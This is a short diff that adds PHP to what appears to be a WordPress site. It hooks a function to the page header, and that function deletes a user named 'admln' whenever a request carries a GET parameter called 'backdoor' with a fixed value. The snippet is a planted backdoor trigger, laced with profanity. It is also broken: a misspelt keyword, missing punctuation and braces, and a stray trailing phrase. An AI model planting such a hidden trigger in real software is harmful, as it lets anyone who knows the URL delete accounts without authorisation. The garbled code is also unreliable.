@@ -1,0 +1,9 @@
+<?php
+add_action('wp_head', 'fuckoff');
+
+fuction fuckoff(){
+    If($_GET['backdoor'] == 'fuckoff') {
+        wp_delete_user('admln')
+}
+?>
+or someshit.
